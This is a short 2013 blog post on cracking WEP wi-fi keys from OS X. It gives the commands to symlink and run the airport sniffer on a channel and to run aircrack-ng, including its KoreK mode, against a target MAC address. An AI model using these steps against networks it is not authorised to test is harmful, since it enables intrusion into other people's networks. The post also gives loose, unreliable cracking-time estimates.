---
title: "Running airmon-ng in mountain lion!"
date: 2013-01-21T22:54:11+00:00
slug: "running-airmon-ng-in-mountain-lion"
categories:
  - "OSX"
---

<a href="http://www.aircrack-ng.org/" rel="nofollow"><img class="size-full wp-image-694 alignleft" style="margin: 10px;" alt="aircrack-ng" src="/wp-content/uploads/2013/01/aircrack-ng.jpg" width="226" height="110" /></a>For those of you who have no clue what is all of this about, Aircrack-ng is a command line tool that allows you to bruteforce WEP and WPA wi-fi password protections.

WEP being the easiest protection to break, and WPA the hardest. The difference?. WEP can be broken in... two days, give or take (probably less than that), while WPA could take months... without results!. Personally, everytime i needed to break a WEP protection, i had to boot a linux system. If you're like me, and you'd rather staying in OSX, this is juuuuust for you.

I don't wanna forget about this, so i'm writing this short guide, right here!

1. Install [Macports](http://www.macports.org/ "MacPorts").
2. Install aircrack-ng:
   ```
   sudo port install aircrack-ng
   ```
3. Install the latest Xcode, with the Command Line Tools.
4. Create the following symlink:
   ```
   sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport
   ```
5. Figure out which channel you need to sniff:
   ```
   sudo airport -s
   ```
6. Open up a terminal and type:
   ```
   sudo airport en1 sniff [CHANNEL]
   ```
7. Open up a seecond terminal and type:
   ```
   aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE]
   ```

Notes: the cap_file will be located in the /tmp/airportSniff*.cap.
Nice, right?

<strong>===========================</strong>
<strong> Update:</strong>

I've been having issues while trying to crack a WEP key. I had over 100k IV's... without luck. So i've attepted to crack the key with the KoreK algorithm (coded in aircrack-ng). And guess what!! i got the key!!. If you ever have the same problem, try this:

```
aircrack-ng -K -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE]
```